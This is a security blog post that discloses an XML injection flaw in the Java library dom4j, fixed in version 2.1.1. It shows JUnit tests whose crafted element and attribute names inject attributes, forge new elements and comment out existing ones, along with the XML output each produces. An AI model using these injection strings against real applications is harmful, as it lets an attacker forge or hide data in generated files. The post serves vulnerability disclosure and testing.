+++
title = "XML Injection in dom4j library"
description = "Brief summary of a vulnerabitity on dom4j by inject XML on element and attribute names"
date = 2018-07-24T13:15:43+10:00
draft = false
toc = false
categories = ["breaking"]
tags = ["xml", "cve", "injection"]
+++

[dom4j](https://dom4j.github.io/) is a well known java library to process and generate XML files.

In version [2.1.1](https://github.com/dom4j/dom4j/releases/tag/version-2.1.1) they fixed an issue regarding a [XML injection on element and attribute names](https://github.com/dom4j/dom4j/issues/48).

<!--more-->

Prior to this version, the values of the elements were properly sanitized, but not the element itself. Same for attribute names. Let me show an example with a test

{{< highlight java "linenos=inline,hl_lines=6 8 20" >}}
    @Test
    public void testXMLInjectionOnElementName() throws IOException {
        Document document = DocumentHelper.createDocument();
        Element root = document.addElement("root");

        String injectedAttribute = "age=\"20\"";

        Element author = root.addElement("author " + injectedAttribute)
                .addAttribute("name", "James")
                .addAttribute("location", "UK");

        Element author2 = root.addElement("author")
                .addAttribute("name", "Bob")
                .addAttribute("location", "US")
                .addText("Bob McWhirter");

        writeFile(document);

        assertThat(document.asXML(), containsString(injectedAttribute));
    }
{{< / highlight >}}

Result:
{{< highlight xml >}}  
<?xml version="1.0" encoding="UTF-8"?>

<root>
  <author age="20" name="James" location="UK"/>
  <author name="Bob" location="US">Bob McWhirter</author>
</root>
{{< / highlight >}}

On `line 6` lives the attribute we want to inject. The injection happens on `line 8` by adding our attribute to the element name. And finally on `line 20`, the test asserts the line was successfully injected. The injection works successfully in case the element is a self closing element (i.e the element does not have any values). If the element has values the injected attribute is also written in the closing element which breaks any XML parsing.

Things get a bit more interesting when playing around with attributes. It is possible to inject new elements by adding them as attribute names, let me show another test as an example.

{{< highlight java "linenos=inline,hl_lines=6 9 20">}}
    @Test
    public void testXMLInjectionOnAttributeName() throws IOException {
        Document document = DocumentHelper.createDocument();
        Element root = document.addElement("root");

        String injectedElement = "<author name=\"hack\" location=\"World\">true</author>";

        Element author = root.addElement("author")
                .addAttribute("name=\"hack\" location=\"World\">true</author><author name", "James")
                .addAttribute("location", "UK")
                .addText("James Strachan");

        Element author2 = root.addElement("author")
                .addAttribute("name", "Bob")
                .addAttribute("location", "US")
                .addText("Bob McWhirter");

        writeFile(document);

        assertThat(document.asXML(), containsString(injectedElement));
    }
{{< / highlight >}}

Result:
{{< highlight xml>}}
<?xml version="1.0" encoding="UTF-8"?>

<root>
  <author name="hack" location="World">true</author><author name="James" location="UK">James Strachan</author>
  <author name="Bob" location="US">Bob McWhirter</author>
</root>

{{< / highlight >}}

This test is very similar to the previous one. Except that instead to add new attributes to an element, we are adding new elements. Also, we are doing that by inject into attribute names, which means we do not have the constraint anymore about self closing elements! The injection through attribute names are very powerful, an attacker could potentially add as many elements as they want.

Not only that, an attacker could comment other elements as well and effectively replacing them! Here comes the test:

{{< highlight java "linenos=inline,hl_lines=6 9 14 20">}}
    @Test
    public void testCommentOtherElementsOnAttributeName() throws IOException {
        Document document = DocumentHelper.createDocument();
        Element root = document.addElement("root");

        String injectedElement = "<author name=\"hack\" location=\"World\">true</author>";

        Element author = root.addElement("author")
                .addAttribute("name=\"hack\" location=\"World\">true</author><!-- author name", "James")
                .addAttribute("location", "UK")
                .addText("James Strachan");

        Element author2 = root.addElement("author")
                .addAttribute("--><author name", "Bob")
                .addAttribute("location", "US")
                .addText("Bob McWhirter");

        writeFile(document);

        assertThat(document.asXML(), containsString(injectedElement));
    }
{{< / highlight >}}

Result:

{{< highlight xml>}}
<?xml version="1.0" encoding="UTF-8"?>

<root>
  <author name="hack" location="World">true</author><!-- author name="James" location="UK">James Strachan</author>
  <author --><author name="Bob" location="US">Bob McWhirter</author>
</root>
{{< / highlight >}}

It is common place in an application to hardcode element names and attribute names, so this bug is not very likely to be exploitable. However, if an attacker somehow can inject whatever she wants on element and attribute names, she can possibly control the whole content of the file.

Thanks to [@FilipJirsak](https://github.com/FilipJirsak) for the quick response and release of the fixed version. Version 2.1.1 and above are fixed and do not have have the issue anymore. Versions below 2.1.1, including the legacy versions ( < 1.6) are also vulnerable.

## References

- https://github.com/dom4j/dom4j/issues/48 - Github issue describing the bug
- https://github.com/mario-areias/dom4j-xml-injection - Repository with the code described on this blog post
- https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008) - Test for XML injection from OWASP